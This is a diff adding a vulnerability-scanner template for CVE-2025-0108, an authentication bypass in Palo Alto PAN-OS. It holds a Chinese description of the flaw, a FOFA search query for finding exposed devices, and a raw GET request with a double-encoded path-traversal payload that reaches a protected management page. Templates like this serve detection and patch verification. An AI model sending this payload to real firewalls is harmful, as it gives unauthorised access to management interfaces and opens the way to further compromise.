@@ -1,0 +1,29 @@
+id: Palo-Alto-Networks-PAN-OS-Authentication-bypass-CVE-2025-0108
+
+info:
+  name: "PAN-OS Nginx 路径解析差异身份验证绕过漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="873381299"
+      该漏洞源于PAN-OS系统中Nginx与Apache服务器在路径解析逻辑层面的实现差异。未经身份验证的远程攻击者可通过构造特定请求路径，利用此差异绕过基于会话的访问控制机制，直接访问受限管理接口。成功利用可导致敏感配置信息泄露、系统权限非授权提升，或通过后续链式攻击实现对目标系统的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/DvjAx5EMgRSLnCUNmwZX7Q
+  tags: Palo-Alto-Networks,PAN-OS
+
+
+http:
+- raw:
+  - |
+    GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "Zero Touch Provisioning"
+  - type: status
+    status:
+    - 200
